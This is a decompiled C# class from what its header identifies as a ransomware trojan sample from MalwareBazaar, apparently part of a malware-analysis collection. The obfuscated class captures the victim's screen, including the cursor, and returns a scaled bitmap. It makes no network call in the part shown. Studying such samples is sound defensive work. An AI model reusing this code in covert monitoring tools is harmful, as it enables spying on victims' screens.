// Decompiled with JetBrains decompiler
// Type: ravighruam.ravighruamSCRNS
// Assembly: ravighruam, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 74F3FC03-D32B-42A6-BF5E-9A04C10FC1EF
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Foreign.gen-3a2d8137283ea060941c3dcbaf2f82ab42ec93af7866b1de1b42f59df23d6f6e.exe

using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace ravighruam
{
  internal class ravighruamSCRNS
  {
    private const int ravighruamCURSOR_SHOWING = 1;

    public Bitmap ravighruamscreen(int mheight)
    {
      bool flag = true;
      Rectangle bounds = Screen.PrimaryScreen.Bounds;
      int width1 = bounds.Width;
      bounds = Screen.PrimaryScreen.Bounds;
      int height1 = bounds.Height;
      Bitmap original = new Bitmap(width1, height1, PixelFormat.Format24bppRgb);
      try
      {
        using (Graphics graphics = Graphics.FromImage((Image) original))
        {
          graphics.CopyFromScreen(0, 0, 0, 0, Screen.PrimaryScreen.Bounds.Size, CopyPixelOperation.SourceCopy);
          if (flag)
          {
            ravighruamSCRNS.CURSORINFO pci;
            pci.cbSize = Marshal.SizeOf(typeof (ravighruamSCRNS.CURSORINFO));
            if (ravighruamSCRNS.GetCursorInfo(out pci) && pci.flags == 1)
            {
              ravighruamSCRNS.DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
              graphics.ReleaseHdc();
            }
          }
        }
      }
      catch
      {
        return (Bitmap) null;
      }
      int height2 = original.Height * (mheight * 100 / original.Height) / 100;
      int width2 = mheight + mheight * 100 / original.Width * mheight / 100 + 100;
      return new Bitmap((Image) original, new Size(width2, height2));
    }

    [DllImport("user32.dll")]
    private static extern bool GetCursorInfo(out ravighruamSCRNS.CURSORINFO pci);

    [DllImport("user32.dll")]
    private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

    private struct CURSORINFO
    {
      public int cbSize;
      public int flags;
      public IntPtr hCursor;
      public ravighruamSCRNS.POINTAPI ptScreenPos;
    }

    private struct POINTAPI
    {
      public int x;
      public int y;
    }
  }
}
